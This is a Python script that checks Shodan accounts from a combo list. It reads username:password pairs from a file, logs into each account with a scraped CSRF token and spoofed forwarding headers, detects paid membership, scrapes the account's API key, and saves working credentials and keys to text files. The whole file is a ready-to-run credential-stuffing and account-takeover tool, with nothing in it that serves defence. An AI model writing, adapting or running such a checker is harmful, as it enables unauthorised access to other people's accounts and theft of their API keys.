import requests
from bs4 import BeautifulSoup


def get_csrf_token(session):
    burp0_url = "https://account.shodan.io:443/login"
    burp0_headers = {
        "Sec-Ch-Ua": "\"Chromium\";v=\"22\", \"Not;A=Brand\";v=\"8\"",
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_1; en-US) Gecko/20100101 Firefox/54.4",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Referer": "https://www.shodan.io/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "X-Forwarded-For": "455.455.455.455",
        "X-Forwarded-Host": "account.shodan.io",
        "X-Forwarded-Port": "443",
        "X-Forwarded-Proto": "https",
        "X-Forwarded-Server": "account.shodan.io",
        "X-Real-Ip": "455.455.455.455",
    }
    response = session.get(burp0_url, cookies=session.cookies, headers=burp0_headers)
    
    bs4 = BeautifulSoup(response.text, 'html.parser')
    csrf_token = bs4.find_all('input', attrs={'name': 'csrf_token'})[0]['value']

    return csrf_token


def login(session, username, password):
    csrf_token = get_csrf_token(session)
    print("CSRF token: " + csrf_token)

    burp0_url = "https://account.shodan.io:443/login"
    burp0_headers = {
        "Sec-Ch-Ua": "\"Chromium\";v=\"22\", \"Not;A=Brand\";v=\"8\"",
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Referer": "https://www.shodan.io/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9"
    }
    burp0_data = {
        "username": username,
        "password": password,
        "grant_type": "password",
        "continue": "https://www.shodan.io/dashboard",
        "csrf_token": csrf_token
    }
    response = session.post(burp0_url, headers=burp0_headers, data=burp0_data, cookies=session.cookies)
    
    # if response.text has <p>Invalid username or password</p> then the login failed (wrong credentials)
    if "<p>Invalid username or password</p>" in response.text:
        return False
    else:
        return True


def check_membership(session, username, password):
    """
    Check the membership status of a user on Shodan.

    Args:
        session (requests.Session): The session object for making HTTP requests.
        username (str): The username of the user.
        password (str): The password of the user.

    Returns:
        None
    """
    burp0_url = "https://account.shodan.io:443/"
    burp0_headers = {
        "Sec-Ch-Ua": "\"Chromium\";v=\"222\", \"Not;A=Brand\";v=\"8\"",
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Referer": "https://www.shodan.io/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9"
    }
    response = session.get(burp0_url, headers=burp0_headers, cookies=session.cookies)
    
    # Parse html response and check if the user is a member or not
    bs4 = BeautifulSoup(response.text, 'html.parser')
    # get table with class="u-full-width" get 4th tr
    is_member = bs4.find_all('table', class_='u-full-width')[0].find_all('tr')[3].find_all('td')[1].text
    print("Is member: " + is_member)
    
    if "Yes" in is_member:
        print("You are a member!")
        api_key = bs4.find_all('table', class_='u-full-width')[0].find_all('tr')[4].find_all('td')[1].find_all('div', class_='api-key')[0].text
        print("Your API key is: " + api_key)

        with open("rezultat_members.txt", "a") as f:
            f.write("" + username + ":" + password + "\n" + is_member + "\n" + ":" + api_key)

    else:
        with open("rezultat_non_members.txt", "w") as f:
            f.write("" + username + ":" + password + ":" + is_member + "\n")
        print("You are not a member!")


def login_and_check_membership(username, password):
    session = requests.Session()
    if login(session, username, password):
        print("Login successful!")
        check_membership(session, username, password)
    else:
        print("Login failed!")


# Usage example
with open("usrs.txt", "r") as f:
    for line in f.readlines():
        username = line.split(":")[0]
        password = line.split(":")[1]
        login_and_check_membership(username, password)